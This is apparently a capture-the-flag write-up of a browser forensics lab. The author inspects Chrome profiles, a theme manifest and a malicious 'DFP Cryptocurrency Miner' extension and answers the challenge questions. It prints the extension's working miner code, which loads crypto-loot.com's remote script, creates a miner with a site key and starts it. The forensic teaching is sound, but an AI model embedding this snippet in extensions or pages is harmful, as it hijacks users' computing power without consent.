# Browser Forensics - Cryptominer

Our SOC alerted that there is some traffic related to crypto mining from a PC that was just joined to the network. The incident response team acted immediately, observed that the traffic is originating from browser applications.  <br>

After collecting all key browser data using FTK Imager, it is your job to use the ad1 file to investigate the crypto mining activity.

## Note

The files for this challenge were too big to fit in the github repository (400+MB).

# Questions

## How many browser-profiles are present in Google Chrome?

Well, went and check how are profiles stored and checked my local to see the folder structure. Usually, the **Default** folder stores a user profile 

``` 
Default folder tree

+---Accounts
+---Application Cache
+---AutofillStrikeDatabase
+---blob_storage
+---BudgetDatabase
+---Cache
+---Code Cache
+---databases
+---data_reduction_proxy_leveldb
+---Extension Rules
+---Extension State
+---Extensions
+---Feature Engagement Tracker
+---File System
+---GCM Store
+---GPUCache
+---IndexedDB
+---JumpListIconsMostVisited
+---JumpListIconsRecentClosed
+---Local Extension Settings
+---Local Storage
+---Managed Extension Settings
+---Platform Notifications
+---Search Logos
+---Service Worker
+---Session Storage
+---Sessions
+---shared_proto_db
+---Site Characteristics Database
+---Storage
+---Sync Data
+---Sync Extension Settings
+---VideoDecodeStats
+---Web Applications
+---WebRTC Logs
```

Another folder, named **Profile 1**, had the same structure

**Answer:** 2

## What is the name of the browser theme installed on Google Chrome? 

If we go to **../Chrome/Default** and open the file **Preferences** we can see the json object that holds the browser settings. Searching for **theme** we can se the id in use

```json
"theme":{"id":"iiihlpikmpijdopbaegjibndhpgjmjfe","pack":"C:\\Users\\IEUser\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Extensions\\iiihlpikmpijdopbaegjibndhpgjmjfe\\1.6_0"}
```

Going to the **iiihlpikmpijdopbaegjibndhpgjmjfe** folder and checking its **manifest** we can see at the top the theme URL which disclaims its name 

``` json
"web_url": "http://atavi.com/browser-themes/?from=chrome-themes&tid=earth_in_space"
```

**Answer:** earth in space

## Identify the Extension ID and Extension Name of the cryptominer

Checking all the other **Extensions's** manifest we can find the cryptominer

```json
{
   "background": {
      "scripts": [ "background.js" ]
   },
   "description": "Allows staff members to mine cryptocurrency in the background of their web browser",
   "icons": {
      "16": "16.png"
   },
   "key": "MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAp1BrfOdr9hldFysTWVfr6nkuAD8IShanyW+d1kG1J6RKUWOCMQTjNUv2R+K+wz5pvgnrHZfc5jx+rGN1VPgs3VQnYCcFjbe2NXLbLLKkXPATIOLrmMjq7pQAEXu5xuqnRU4AkHumpEX81UD0Vv1TgAi5k1mZLrg5F2B02yXz1tfmMIiqCc/mG7K0/ECNUHXjzi/0B5Ubx3DCZvVSN32H+QvF7lxBnOpgjK9syeHPj4iXiyV9lgiCQjMGe4lKsVJfFT5nAf8tY2BBmna1MtY4LLwV1dIvJ922oFGEs0ty6391RwmC6S0j0oIOdGgQjylZKDREzVw959g/3PGp0lj9BQIDAQAB",
   "manifest_version": 2,
   "minimum_chrome_version": "9",
   "name": "DFP Cryptocurrency Miner",
   "omnibox": {
      "keyword": "DFP Miner"
   },
   "update_url": "https://clients2.google.com/service/update2/crx",
   "version": "3"
}
```

**Answer:** egnfmleidkolminhjlkaomjefheafbbb,DFP Cryptocurrency Miner

## What is the description text of this extension? 

This can be exfiltrated from the previous answer mentioned manifest

**Answer:** Allows staff members to mine cryptocurrency in the background of their web browser

## What is the name of the specific javascript web miner used in the browser extension? 

We can see the answer in the **.js** file within the extension folder

```js
<script src="https://crypto-loot.com/lib/miner.min.js"></script>
<script>
var miner=new CryptoLoot.Anonymous('b23efb4650150d5bc5b2de6f05267272cada06d985a0',
        {
        threads:3,autoThreads:false,throttle:0.2,
        }
);
miner.start();
</script>
<script>
	// Listen on events
	miner.on('found', function() { /* Hash found */ })
	miner.on('accepted', function() { /* Hash accepted by the pool */ })
 
	// Update stats once per second
	setInterval(function() {
		var hashesPerSecond = miner.getHashesPerSecond(20);
		var totalHashes = miner.getTotalHashes(256000000);
		var acceptedHashes = miner.getAcceptedHashes();
 
		// Output to HTML elements...
	}, 1000);
</script>
``` 

**Answer:** CryptoLoot

## How many hashes is the crypto miner calculating per second?

From the **.js** we can see that directly

```js
var hashesPerSecond = miner.getHashesPerSecond(20);
```

**Answer:** 20

## What is the public key associated with this mining activity? 

Again, from the **.js**

```js
var miner=new CryptoLoot.Anonymous('b23efb4650150d5bc5b2de6f05267272cada06d985a0',
        {
        threads:3,autoThreads:false,throttle:0.2,
        }
);
```
**Answer:** b23efb4650150d5bc5b2de6f05267272cada06d985a0

## What is the URL of the official Twitter page of the javascript web miner? 

And, yet again, from the **.js** we can see that it is pulling some JavaScript dynamically 

```js
<script src="https://crypto-loot.com/lib/miner.min.js"></script>
```

Accessing it, Ctrl+U (to view source code), Ctrl+F -> twitter
```html
<div class="social-icons">
    <a href="https://www.facebook.com/cryptolootminer/"><span class="ti-facebook"></span></a>
    <a href="https://twitter.com/CryptoLootMiner"><span class="ti-twitter-alt"></span></a>
    <a href="https://www.reddit.com/r/CryptoLoot/"><span class="ti-reddit"></span></a>
</div>
```

**Answer:** twitter.com/CryptoLootMiner